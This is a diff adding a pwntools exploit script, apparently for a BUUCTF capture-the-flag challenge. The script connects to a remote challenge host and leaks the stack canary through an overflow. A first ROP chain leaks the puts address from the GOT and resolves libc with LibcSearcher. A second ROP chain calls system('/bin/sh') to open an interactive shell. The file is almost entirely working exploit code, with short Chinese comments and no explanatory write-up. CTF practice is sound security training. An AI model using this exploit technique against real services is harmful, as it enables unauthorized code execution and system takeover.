@@ -1,0 +1,53 @@
+from pwn import *
+from LibcSearcher import *
+context.log_level = 'debug'
+
+r = remote('node5.buuoj.cn', 29306)
+# 本地调试用：
+# r = process('./1')
+
+pop_rdi = 0x0000000000400a93
+elf = ELF('./1')
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+main_addr = 0x400908
+
+# 泄露 canary
+r.sendlineafter(b'>>', b'1')
+r.sendline(b'a' * (0x90 - 0x8))
+r.sendlineafter(b'>>', b'2')
+r.recvuntil(b'a\n')
+canary = u64(r.recv(7).ljust(8, b'\x00'))
+print('[+]canary: ', hex(canary))
+
+# 第一次 ROP：泄露 puts 地址
+payload = b'a' * (0x90 - 0x8) + p64(canary) + b'b' * 0x8
+payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+r.sendlineafter(b'>>', b'1')
+r.sendline(payload)
+
+# 关键修改：不要立即发 '3'，而是发 '2' 来触发打印（触发 ROP）
+r.sendlineafter(b'>>', b'2')  # 改成 '2' 而不是 '3'
+
+# 接收泄露的地址
+puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
+print('[+]puts_addr: ', hex(puts_addr))
+
+# 查找 libc
+libc = LibcSearcher('puts', puts_addr)
+libc_base = puts_addr - libc.dump('puts')
+system_addr = libc_base + libc.dump('system')
+bin_addr = libc_base + libc.dump('str_bin_sh')
+print('[+]system_addr: ', hex(system_addr))
+print('[+]bin_addr: ', hex(bin_addr))
+
+# 第二次 ROP：getshell
+payload2 = b'a' * (0x90 - 0x8) + p64(canary) + b'b' * 0x8
+payload2 += p64(pop_rdi) + p64(bin_addr) + p64(system_addr)
+r.sendlineafter(b'>>', b'1')
+r.sendline(payload2)
+
+# 触发第二次 payload
+r.sendlineafter(b'>>', b'2')
+
+r.interactive()
